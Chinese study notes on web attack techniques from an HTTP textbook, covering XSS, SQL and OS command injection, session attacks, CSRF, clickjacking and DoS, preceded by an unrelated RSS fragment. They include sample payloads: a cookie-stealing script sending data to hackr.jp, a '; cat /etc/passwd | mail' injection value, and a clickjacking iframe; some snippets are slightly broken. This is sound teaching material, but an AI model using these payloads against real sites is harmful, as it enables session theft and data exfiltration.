<channel rdf:about="http://d.hatena.ne.jp/sen-u/rss">
<title>兔子的文学日记</title>
<link>http://d.hatena.ne.jp/sen-u/</link>
<description>兔子的文学日记</description>
</channel>

<item rdf:about="http://d.hatena.ne.jp/sen-u/20121215/p1">
<title>[security]提供脆弱性悬赏奖金计划的网站一览</title>
<link>http://d.hatena.ne.jp/sen-u/20121215/p1</link>
<description> 正是所谓“是所谓 Bounty Programs”、处理接受Web脆弱性的相关信息，并提供奖金的计划 ...</description>
<dc:creator>sen-u</dc:creator>
<dc:date>2012-12-15</dc:date>
<dc:subject>security</dc:subject>
</item>
```

**9.4.3 JavaScript 衍生的轻量级易用 JSON**

JSON（JavaScript Object Notation）是一种以 JavaScript（ECMAScript）的对象表示法为基础的轻量级数据标记语 言。能够处理的数据类型有 false/null/true/ 对象 / 数组 / 数字 / 字符 串，这 7 种类型。

`{"name": "Web Application Security", "num": "TR001"}`

JSON 让数据更轻更纯粹，并且 JSON 的字符串形式可被 JavaScript 轻易地读入。当初配合 XML使用的 Ajax 技术也让 JSON 的应用变得 更为广泛。另外，其他各种**编程语言**也提供丰富的**库**类，以达到轻便操作 JSON 的目的。

## 第十章 Web 的攻击技术

### 10.1 针对 Web 的攻击技术

简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服务器上的 Web 应用等资源才是攻击目标。 

**10.1.1 HTTP 不具备必要的安全功能**

与最初的设计相比，现今的 Web 网站应用的 HTTP 协议的使用方式 已发生了翻天覆地的变化。几乎现今所有的 Web 网站都会使用会话 （session）管理、加密处理等安全性方面的功能，而 HTTP 协议内并 不具备这些功能。

从整体上看，HTTP 就是一个通用的单纯协议机制。因此它具备较多优势，但是在安全性方面则呈劣势。

就拿远程登录时会用到的 SSH 协议来说，SSH 具备协议级别的认证及会话管理等功能，HTTP 协议则没有。另外在架设 SSH 服务方面，任何人都可以轻易地创建安全等级高的服务，而 HTTP 即使已架设好服务器，但若想提供服务器基础上的 Web 应用，很多情况下都需要重新开发。

开发者需要自行设计并开发认证及会话管理功能来满足 Web 应用的安全。而自行设计就意味着会出现各种形形色色的实现。结果，安全等级并不完备，可仍在运作的 Web 应用背后却隐藏着各种容易被攻击者滥用的安全漏洞的 Bug。

**10.1.2 在客户端即可篡改请求**

在 Web 应用中，从浏览器那接收到的 HTTP 请求的全部内容，都可以在客户端自由地变更、篡改。所以 Web 应用可能会接收到与预期数据不相同的内容。

在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击。 通过 **URL** **查询字段或表单**、**HTTP 首部**、**Cookie** 等途径把攻击代码传 入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。

![[Pasted image 20220920163224.png]]

**10.1.3 针对 Web 的应用攻击模式**

**以服务器为目标的主动攻击**

主动攻击 (active attack) 是指攻击者通过直接访问 Web 应用, 把攻击代码传入的攻击模式. 由于该模式是直接针对服务器上的资源进行攻击, 因此攻击者需要能够访问到那些资源

主动攻击力最具有代表性的攻击是 SQL 注入和 OS 命令注入攻击

![[Pasted image 20220920163435.png]]

**以服务器为目标的被动攻击**

被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访 问发起攻击。

被动攻击通常的攻击模式如下所示。

- 步骤 1： 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。 
- 步骤 2： 当用户不知不觉中招之后，**用户的浏览器或邮件客户端**就会**触发这个陷阱**。 
- 步骤 3： 中招后的**用户**浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，**运行攻击代码**。
- 步骤 4： 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 **Cookie** 等**个人信息被窃取**， 登录状态中的用户权限遭恶意滥用等后果。 

被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。

![[Pasted image 20220920163717.png]]

**利用用户的身份攻击企业内部网络**

利用被动攻击, 可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户能够访问到的网络范围内，即使是企业内网也同样会受到攻击。

很多企业内网依然可以连接到互联网上，访问 Web 网站，或接收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用 户触发陷阱后对企业内网发动攻击。

![[Pasted image 20220920192003.png]]

### 10.2 因输出值转义不完全引发的安全漏洞

实施 Web 应用的安全对策可大致分为以下两部分。

- 客户端的验证
- Web 应用端 (服务器端) 的验证
	- 输入值验证
	- 输出值转义

![[Pasted image 20220920192058.png]]

多数情况下采用 **JavaScript** 在客户端验证数据。可是在客户端允许**篡改数据**或**关闭 JavaScript**，不适合将 JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到**提高 UI 体验**的作用。

Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。

从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。

**10.2.1 跨站脚本攻击**

跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 **HTML 标签**或 **JavaScript** 进行的一种攻击。动态创建的 HTML部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一 不小心就会受到被动攻击。

跨站脚本可能造成以下影响

- 利用虚假输入表单骗取用户个人信息 (钓鱼)
- 利用脚本窃取用户 Cookie 值, 被害者在不知情的情况下, 帮助攻击者发送恶意请求
- 显示伪造的文章或图片

**跨站脚本攻击案例**

在动态生成 HTML 处发生

下面以编辑个人信息页面为例讲解跨站脚本攻击. 下方界面显示了用户输入的个人信息内容

![[Pasted image 20220920193018.png]]

确认界面按原样在编辑界面输入的字符串. 此处输入带有山口一郎这样的 HTML 标签的字符串

![[Pasted image 20220920193059.png]]

此时的确认界面上, 浏览器会把用户输入的 `<s>` 解析成 html 标签, 然后显示删除线爱你

删除线显示出来并不会造成什么后果, 但如果换成 script 标签, 就有可能被利用而设置 XSS 陷阱

跨站脚本攻击属于被动攻击模式, 需要受害者点击陷阱才会触发.

下面是网站拖过地址栏 URI 的查询字段指定 ID, 即相当于在表单内自动填写字符串的功能. 而就在这地方, 隐藏着可执行跨站脚本攻击的漏洞

![[Pasted image 20220920193252.png]]

充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶 意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页 面内，诱使用户去点击该 URL。

`http://example.jp/login?ID="><script>alert(123)</script>`

用户打开浏览器页面后, 即执行 `<script>alert(123)</script>` 弹出窗口

正常访问时的 HTML 源代码

```html
<div class="logo">
	<img src="/img/logo.gif" alt="E! 拍卖会" />
</div>
<form action="http://example.jp/login" method="post" id="login">
<div class="input_id">
	ID <input type="text" name="ID" value="yama" />
</div>
```

访问恶意链接时的 HTML 源代码

```html
<div class="logo">
	<img src="/img/logo.gif" alt="E! 拍卖会 />
</div>
<form action="http://example.jp/login" method="post" id="login">
<div class="input_id">
	ID <input type="text" name="ID" value=""><script>alert(123)</script>
</div>
```

**对用户 Cookie 的窃取攻击**

除了在表单中设下圈套之外, 下面这种恶意脚本同样能够以跨站脚本攻击的方式, 窃取到用户的 Cookie 信息.

```javascript
<script src="http://hacker.jp/xss.js></script>
```
该脚本内指定的 `http://hacker.jp/xss.js` 文件内容如下

```javascript
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```

在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段 JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信息。然后这些信息会发送至攻击者的 Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的 Cookie 信息了。

**10.2.2 SQL 注入攻击**

SQL注入（SQLInjection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。

SQL注入攻击有可能会造成以下等影响。 

- 非法查看或篡改数据库内的数据
- 规避认证
- 执行和数据库服务器业务关联的程序等

SQL 攻击示例

```mysql
# 原始语句
SELECT FROM bookTbl WHERE author ='Sq' and flag = 1;

# 恶意语句
SELECT FROM bookTbl WHERE author='上野宣--'and flag = 1;
```
**10.2.3 OS 命令注入攻击**

OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。

OS 注入攻击案例

表单核心代码

```java

my $adr = $q->param('mailaddress');
open(MAIL, "| /usr/sbin/sendmail $adr");
print MAIL "From: info@example.com\n";
```

用户构造恶意输入内容: `; cat /etc/passwd | mail hack@example.jp`

程序执行的命令: `| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp`

攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被
解析为分隔多个执行命令的标记。

**10.2.4 HTTP 首部注入攻击**

HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。

向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTP
Response Splitting Attack）。

如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie。

```http
Location: http://www.example.com/a.cgi?q=12345
Set-Cookie: UID=12345
＊12345就是插入值
```
HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击。

HTTP 首部注入攻击有可能会造成以下一些影响。

- 设置任何 Cookie 信息
- 重定向至任意 URL
- 显示任意的主题 (HTTP 响应截断攻击)

**HTTP 首部注入攻击案例 / HTTP 响应截断攻击**

参考 sqli-labs-Less18-19

**10.2.5 邮件首部注入攻击** 省略

**10.2.6 目录遍历攻击** 省略

**10.2.7 文件包含漏洞** 省略

### 10.3 因设置或设计上的缺陷引发的安全漏洞 (大概率已过时)

因设置或设计上的缺陷引发的安全漏洞是指，错误设置 Web 服务
器，或是由设计上的一些问题引起的安全漏洞。

**11.3.1 强制浏览**

强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件

强制浏览有可能会造成以下一些影响。

- 泄露顾客的个人信息等重要情报
- 泄露原本需要具有访问权限的用户才可查阅的信息内容
- 泄露未外连到外界的文件

对那些原本不愿公开的文件，为了保证安全会隐蔽其 URL。可一旦知道了那些 URL，也就意味着可浏览 URL对应的文件。直接显示容易推测的文件名或文件目录索引时，通过某些方法可能会使 URL产生泄露。


**文件目录一览**

`http://www.example.com/log/`

通过指定文件目录名称，即可在文件一览中看到显示的文件名。容易被推测的文件名及目录名

`http://www.example.com/entry/entry_081202.log`

文件名称容易推测（按上面的情况，可推出下一个文件是entry_081203.log）

备份文件

```text
http://www.example.com/cgi-bin/entry.cgi（原始文件）
http://www.example.com/cgi-bin/entry.cgi~（备份文件）
http://www.example.com/cgi-bin/entry.bak（备份文件）
```

由编辑软件自动生成的备份文件无执行权限，有可能直接以源代码形式显示经认证才可显示的文件直接通过 URL访问原本必须经过认证才能在 Web 页面上使用的文件（HTML文件、图片、PDF 等文档、CSS 以及其他数据等）

**强制浏览导致安全漏洞的案例**

下面我们以会员制度的 SNS 日记功能为例，讲解强制浏览可能导致的安全漏洞。该日记功能保证了除具有访问权限的用户本人以外，其他人都不能访问日记。

该日记中包含的图像照片的源代码如下所示。

``<img src="http://example.com/img/tRNqSUBdG7Da.jpg">`

即使没有对这篇日记的访问权限，只要知道这图片的 URL，通过直接指定 URL的方式就能显示该图片。日记的功能和文本具有访问对象的控制，但不具备对图片访问对象的控制，从而产生了安全漏洞。

**10.3.2 不正确的错误消息处理**

不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。与 Web 应用有关的主要错误信息如下所示。

- Web 应用抛出的错误消息
- 数据库等系统抛出的错误消息

Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示。

常见的错误提示消息如下

- 用户未注册/账号不存在
- PHP 或 ASP 等脚本错误
- 数据库或中间件的错误
- Web 服务器的错误

**10.3.3 开放重定向**

开放重定向 (Open Redirect) 是一种对指定的 URl 作重定向跳转的功能. 漏洞的存在可能导致用户访问正常网站时, 被恶意重定向至恶意站点.

**开放重定向的攻击案例**

```
http://example.com/?redirect=http://www.tricorder.jp
```

攻击者把重定向指定的参数改写成已设好陷阱的 Web 网站对应
的连接，如下所示。

```
http://example.com/?redirect=http://hackr.jp
```

### 10.4 因会话管理疏忽引发的安全漏洞

**10.4.1 回话劫持**

会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。

下面列举了几种攻击者可获得会话 ID 的途径。

- 通过非正规的生成方法推测会话 ID 
- 通过窃听或 XSS 攻击盗取会话 ID 
- 通过会话固定攻击（Session Fixation）强行获取会话 ID

**会话劫持攻击案例**

下面我们以认证功能为例讲解会话劫持。这里的认证功能通过会话管理机制，会将成功认证的用户的会话 ID（SID）保存在用户浏览器的 Cookie 中。

攻击者在得知该 Web 网站存在可跨站攻击（XSS）的安全漏洞后，就设置好用 JavaScript 脚本调用 `document.cookie` 以窃取Cookie 信息的陷阱，一旦用户踏入陷阱（访问了该脚本），攻击者就能获取含有会话 ID 的 Cookie。 (与 XSS 漏洞配合使用)

攻击者拿到用户的会话 ID 后，往自己的浏览器的 Cookie 中设置该会话 ID，即可伪装成会话 ID 遭窃的用户，访问 Web 网站了。

**10.4.2 会话固定攻击**

对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。

**会话固定攻击案例**

下面我们以认证功能为例讲解会话固定攻击。这个 Web 网站的
认证功能，会在认证前发布一个会话 ID，若认证成功，就会在
服务器内改变认证状态。

![[Pasted image 20220920201349.png]]

攻击者准备陷阱，先访问 Web 网站拿到会话 ID（SID=f5d1278e8109）。此刻，会话 ID 在服务器上的记录仍是（未认证）状态。（步骤① ~ ②）

攻击者设置好强制用户使用该会话 ID 的陷阱，并等待用户拿着这个会话 ID 前去认证。一旦用户触发陷阱并完成认证，会话ID（SID=f5d1278e8109）在服务器上的状态（用户 A 已认证）就会被记录下来。（步骤③）

攻击者估计用户差不多已触发陷阱后，再利用之前这个会话 ID 访问网站。由于该会话 ID 目前已是（用户 A 已认证）状态，于 是攻击者作为用户 A 的身份顺利登录网站。（步骤④）(类似于钓鱼)

**Session Adoption**

Session Adoption 是指 PHP 或 ASP.NET 能够接收处理未知会话 ID 的功能。

恶意使用该功能便可跳过会话固定攻击的准备阶段，从 Web 网站 获得发行的会话 ID 的步骤。即，攻击者可私自创建会话 ID构成陷阱，中间件却会误以为该会话 ID 是未知会话 ID 而接受。

**10.4.3 跨站点请求伪造**

跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。

跨站点请求伪造有可能会造成以下等影响。

- 利用已通过认证的用户权限更新设定信息
- 利用已通过认证的用户权限购买商品
- 利用已通过认证的用户权限在留言板上发表言论

**跨站点请求伪造的攻击案例**

下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容

![[Pasted image 20220920201723.png]]

在该留言板系统上，受害者用户 A 是已认证状态。它的浏览器中的 Cookie 持有已认证的会话 ID（步骤①）。

攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户 A 的浏览器执行完陷阱中的 请求后，留言板上也就会留下那条评论（步骤②）。

触发陷阱之际，如果用户 A 尚未通过认证，则无法利用用户 A 的身份权限在留言板上发表内容。

### 10.5 其他安全漏洞

**10.5.1 密码破解**

密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不 仅限于 Web 应用，还包括其他的系统（如 FTP 或 SSH 等），本节将 会讲解对具备认证功能的 Web 应用进行的密码破解。

密码破解有以下两种手段。

- 通过网络的密码试错
- 对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）

**通过网络的密码试错**

穷举法/字典攻击

**对已加密密码的破解**

Web 应用在保存密码时，一般不会直接以明文的方式保存，通过
散列函数做散列处理或加 salt 的手段对要保存的密码本身加密。
那即使攻击者使用某些手段窃取密码数据，如果想要真正使用这
些密码，则必须先通过解码等手段，把加密处理的密码还原成明
文形式。

通过穷举法·字典攻击进行类推/彩虹表/密钥/加密算法的漏洞

**10.5.2 点击劫持**

点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装 (UIRedressing).

已设置陷阱的 Web 页面，表面上内容并无不妥，但早已埋入想让用 户点击的链接。当用户点击到透明的按钮时，实际上是点击了已指定 透明属性元素的 iframe 页面。

**点击劫持案例**

下面以 SNS 网站的注销功能为例，讲解点击劫持攻击。利用该注销功能，注册登录的 SNS 用户只需点击注销按钮，就可以从 SNS 网站上注销自己的会员身份。

攻击者在预料用户会点击的 Web 页面上设下陷阱。上图中钓鱼 游戏页面上的 PLAY 按钮就是这类陷阱的实例。

在做过手脚的 Web 页面上，目标的 SNS 注销功能页面将作为透明层覆盖在游戏网页上。覆盖时，要保证 PLAY 按钮与注销按钮的页面所在位置保持一致。

iframe 页面中使用透明可点击按钮的示例

```html
<iframe id="target" src="http://sns.example.jp/leave" style="opacity:0;filter:alpha(opacity=0)"></iframe>
<button style="position:absolute;top:100;left:100;z-index:-1">PLAY</button>
```

由于 SNS 网站作为透明层被覆盖，SNS 网站上处于登录状态的 用户访问这个钓鱼网站并点击页面上的 PLAY 按钮之后，等同于 点击了 SNS 网站的注销按钮。

**10.5.3 DoS 攻击**

DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状 态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对 象不仅限于 Web 网站，还包括网络设备及服务器等。

主要有以下两种 DoS 攻击方式。 

- 集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。 
- 通过攻击安全漏洞使服务停止。 其中，集中利用访问请求的 DoS 攻击，单纯来讲就是发送大量的合法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防止 DoS 攻击。

多台计算机发起的 DoS 攻击称为 DDoS 攻击（Distributed Denial ofService attack）。DDoS 攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。

**10.5.4 后门程序**

后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。

通常的后门程序分为以下 3 种类型。 

- 开发阶段作为 Debug 调用的后门程序
- 开发者为了自身利益植入的后门程序
- 攻击者通过某种方法设置的后门程序

可通过监视进程和通信的状态发现被植入的后门程序。但设定在 Web 应用中的后门程序，由于和正常使用时区别不大，通常很难发现。